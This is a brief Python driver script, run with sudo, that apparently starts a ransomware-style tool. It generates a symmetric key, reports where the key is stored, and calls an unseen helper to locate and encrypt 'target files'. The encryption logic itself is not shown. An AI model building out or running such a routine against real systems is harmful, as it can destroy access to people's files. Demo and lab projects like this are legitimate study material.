#!/usr/bin/sudo python3

import sys
from os import system

from utils import create_symmetric_key, encrypt_target_files
from config import starter_text, Color

def encrypt():
	try:
		print(starter_text, end="\n\n")

		# Symmetric key stuff
		symmetric_key , symmetric_key_path = create_symmetric_key()
		print(Color.WHITE + f'Key Created Successfully: {symmetric_key}')
		print(Color.WHITE + 'Key stored in ' + symmetric_key_path)

		# Encrypt files
		print('\nLocating Target Files')
		print('Beginning Crypto Operations')
		encrypt_target_files(symmetric_key)

	except KeyboardInterrupt:
		print(Color.RED + 'Ctrl +C pressed!!Exiting....')
		sys.exit()

if __name__ == "__main__":
	system('clear')
	encrypt()
	print(Color.RED + '[*] File Encryption Done!')